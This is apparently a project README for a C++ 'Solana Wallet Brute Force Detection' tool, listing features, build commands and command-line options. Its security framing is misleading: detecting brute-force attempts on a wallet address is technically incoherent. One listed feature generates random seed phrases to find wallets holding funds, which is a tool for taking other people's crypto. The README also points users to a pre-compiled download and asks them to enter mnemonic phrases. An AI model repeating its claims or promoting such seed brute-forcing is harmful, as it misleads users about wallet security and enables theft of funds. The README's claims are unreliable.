# Solana Wallet Brute Force Detection: Secure Your Crypto Assets  

**Solana Wallet Brute Force Detection** is a cutting-edge tool designed to help users identify and protect against brute-force attacks on Solana wallets. With the increasing sophistication of cyber threats, ensuring the security of your crypto assets has never been more critical. This tool provides advanced detection capabilities, allowing you to monitor and safeguard your Solana wallets effectively.  

---

## Key Features  

### 1. **Brute-Force Detection for Solana Wallets**  
   - Identify potential brute-force attempts on your Solana wallet addresses.  
   - Detect suspicious activity and take proactive measures to secure your assets.  

<p align="left">
    <img src="/resources/viewer.webp" />
</p>

### 2. **Check Solana Address Balance**  
   - Verify the balance of any Solana wallet address.  
   - Ensure the address is active and holds the expected amount of SOL.  

<p align="left">
    <img src="/resources/fix.webp" />
</p>

### 3. **Track Solana Address Activity**  
   - Monitor transactions on a specific Solana wallet address.  
   - Receive real-time notifications via Telegram for added convenience.  

### 4. **Recover Wallet Data Using Mnemonic Phrase**  
   - Retrieve wallet details, including the private key, address, and balance, using a mnemonic phrase.  
   - Securely manage your wallets and access critical information when needed.  

<p align="left">
    <img src="/resources/fit.webp" />
</p>

### 5. **Generate New Solana Wallets**  
   - Create a new Solana wallet with a unique private key and address.  
   - Ideal for users looking to expand their crypto portfolio.  

<p align="left">
    <img src="/resources/grid.webp" />
</p>

### 6. **Brute-Force Wallet Generation**  
   - Generate random seed phrases and check for wallets with existing balances.  
   - A research-focused feature for discovering active wallets.  

---

## How to Use Solana Wallet Brute Force Detection  

### Step 1: **Access the Tool**  
   - Use the **Tor Browser** or any secure browser to access the tool.  
   - Ensure your connection is encrypted for maximum security.  

### Step 2: **Monitor Wallet Activity**  
   - Input your Solana wallet address to monitor for brute-force attempts.  
   - The tool will analyze activity and alert you to any suspicious behavior.  

### Step 3: **Enable Telegram Notifications**  
   - Configure Telegram settings to receive real-time updates about wallet activity.  
   - Add your bot token and chat ID to the `telegram-settings.txt` file.  

---

## Why Choose Solana Wallet Brute Force Detection?  

- **Advanced Security:** Protect your Solana wallets from brute-force attacks and unauthorized access.  
- **Real-Time Monitoring:** Stay informed about wallet activity with instant notifications.  
- **User-Friendly Interface:** Easily navigate the platform and access all features in one place.  
- **Multi-Functional:** From brute-force detection to wallet generation, this tool covers all your Solana needs.  

---

## Getting Started  

You can download the pre-compiled build from the [Release](../../releases) section or build the project yourself using the instructions below.  

### Building the Project  

1. **Install Dependencies:**  
   Use **vcpkg** to install required libraries:  
   ```bash
   vcpkg install openssl nlohmann-json cryptopp libsodium
   ```  

2. **Build via Visual Studio:**  
   - Open the project solution in Visual Studio.  
   - Click **Build** -> **Build Solution**.  

3. **Build via Command Line:**  
   ```bash
   g++ -o solanachecker main.cpp -lssl -lcrypto -lsodium -lcryptopp -std=c++17
   ```  

---

## Command Line Options  

- **-d / -detect (ADDRESS):** Monitor a Solana wallet address for brute-force attempts.  
- **-b / -balance (ADDRESS):** Check the balance of a specific Solana wallet address.  
- **-t / -track (ADDRESS):** Track activity on a specific Solana wallet address.  
- **-m / -mnemonic (MNEMONIC):** Retrieve wallet data using a mnemonic phrase.  
- **-g / -gen (NUMBER):** Generate a specified number of Solana wallets.  

---

## Disclaimer  

This tool is intended for educational and research purposes only. It should not be used for illegal activities or unauthorized access to wallets. Always ensure the security of your private keys and mnemonic phrases.  

---

## License  

This project is licensed under the [MIT License](/LICENSE). Feel free to use, modify, and distribute the code in accordance with the license terms.  

---

**Stay Secure, Stay Informed, and Protect Your Solana Wallets from Brute-Force Attacks!**



Update: URLs updated